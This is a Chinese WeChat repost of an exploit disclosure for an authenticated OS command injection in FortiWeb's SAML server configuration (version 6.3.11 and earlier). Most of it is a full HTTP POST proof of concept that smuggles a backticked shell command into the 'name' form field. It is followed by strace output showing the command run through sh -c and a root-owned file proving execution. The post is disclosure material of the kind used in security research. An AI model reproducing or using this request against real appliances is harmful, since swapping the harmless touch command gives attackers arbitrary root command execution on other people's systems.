##  0day Fortinet FortiWeb OS 命令注入

[ 黑白之道 ](javascript:void\(0\);)

**黑白之道** ![]()

微信号 i77169

功能介绍 我们是网络世界的启明星，安全之路的垫脚石。

____

__

收录于话题

![](https://gitee.com/fuli009/images/raw/master/public/20210823075153.png)

> 文章来源：Khan安全攻防实验室

![](https://gitee.com/fuli009/images/raw/master/public/20210823075154.png)

  

![]()

  

        FortiWeb 管理界面（版本 6.3.11 及更早版本）中的操作系统命令注入漏洞可允许远程、经过身份验证的攻击者通过 SAML 服务器配置页面在系统上执行任意命令。

  

POC：  

  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /api/v2.0/user/remoteserver.saml HTTP/1.1Host: [redacted]Cookie: [redacted]User-Agent: [redacted]Accept: application/json, text/plain, */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: https://[redacted]/root/user/remote-user/saml-user/X-Csrftoken: 814940160Content-Type: multipart/form-data; boundary=---------------------------94351131111899571381631694412Content-Length: 3068Origin: https://[redacted]Dnt: 1Te: trailersConnection: close-----------------------------94351131111899571381631694412Content-Disposition: form-data; name="q_type"1-----------------------------94351131111899571381631694412Content-Disposition: form-data; name="name"`touch /tmp/vulnerable`-----------------------------94351131111899571381631694412Content-Disposition: form-data; name="entityID"test-----------------------------94351131111899571381631694412Content-Disposition: form-data; name="service-path"/saml.sso-----------------------------94351131111899571381631694412Content-Disposition: form-data; name="session-lifetime"8-----------------------------94351131111899571381631694412Content-Disposition: form-data; name="session-timeout"30-----------------------------94351131111899571381631694412Content-Disposition: form-data; name="sso-bind"post-----------------------------94351131111899571381631694412Content-Disposition: form-data; name="sso-bind_val"1-----------------------------94351131111899571381631694412Content-Disposition: form-data; name="sso-path"/SAML2/POST-----------------------------94351131111899571381631694412Content-Disposition: form-data; name="slo-bind"post-----------------------------94351131111899571381631694412Content-Disposition: form-data; name="slo-bind_val"1-----------------------------94351131111899571381631694412Content-Disposition: form-data; name="slo-path"/SLO/POST-----------------------------94351131111899571381631694412Content-Disposition: form-data; name="flag"0-----------------------------94351131111899571381631694412Content-Disposition: form-data; name="enforce-signing"disable-----------------------------94351131111899571381631694412Content-Disposition: form-data; name="enforce-signing_val"0-----------------------------94351131111899571381631694412Content-Disposition: form-data; name="metafile"; filename="test.xml"Content-Type: text/xml<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" validUntil="2021-06-12T16:54:31Z" cacheDuration="PT1623948871S" entityID="test"><md:IDPSSODescriptor WantAuthnRequestsSigned="false" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:KeyDescriptor use="signing"><ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:X509Data><ds:X509Certificate>test</ds:X509Certificate></ds:X509Data></ds:KeyInfo></md:KeyDescriptor><md:KeyDescriptor use="encryption"><ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:X509Data><ds:X509Certificate>test</ds:X509Certificate></ds:X509Data></ds:KeyInfo></md:KeyDescriptor><md:NameIDFormat>urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified</md:NameIDFormat><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="test"/></md:IDPSSODescriptor></md:EntityDescriptor>-----------------------------94351131111899571381631694412--HTTP/1.1 500 Internal Server ErrorDate: Thu, 10 Jun 2021 11:59:45 GMTCache-Control: no-cache, no-store, must-revalidatePragma: no-cacheSet-Cookie: [redacted]X-Frame-Options: SAMEORIGINX-XSS-Protection: 1; mode=blockContent-Security-Policy: frame-ancestors 'self'X-Content-Type-Options: nosniffContent-Length: 20Strict-Transport-Security: max-age=63072000Connection: closeContent-Type: application/json{"errcode": "-651"}

  

“touch”命令连接在 mkdir shell 命令中：

  

  *   *   *   * 

    
    
    [pid 12867] execve("/migadmin/cgi-bin/fwbcgi", ["/migadmin/cgi-bin/fwbcgi"], 0x55bb0395bf00 /* 42 vars */) = 0[pid 13934] execve("/bin/sh", ["sh", "-c", "mkdir /data/etc/saml/shibboleth/service_providers/`touch /tmp/vulnerable`"], 0x7fff56b1c608 /* 42 vars */) = 0[pid 13935] execve("/bin/touch", ["touch", "/tmp/vulnerable"], 0x55774aa30bf8 /* 44 vars */) = 0[pid 13936] execve("/bin/mkdir", ["mkdir", "/data/etc/saml/shibboleth/service_providers/"], 0x55774aa30be8 /* 44 vars */) = 0

  

在 FortiWeb 设备的本地命令行上看到“touch”命令的结果：

  

  *   *   * 

    
    
    /# ls -l /tmp/vulnerable-rw-r--r--    1 root     0                0 Jun 10 11:59 /tmp/vulnerable/#

侵权请私聊公众号删文

![](https://gitee.com/fuli009/images/raw/master/public/20210823075155.png)

![](https://gitee.com/fuli009/images/raw/master/public/20210823075156.png)

![](https://gitee.com/fuli009/images/raw/master/public/20210823075157.png)

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

0day Fortinet FortiWeb OS 命令注入

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

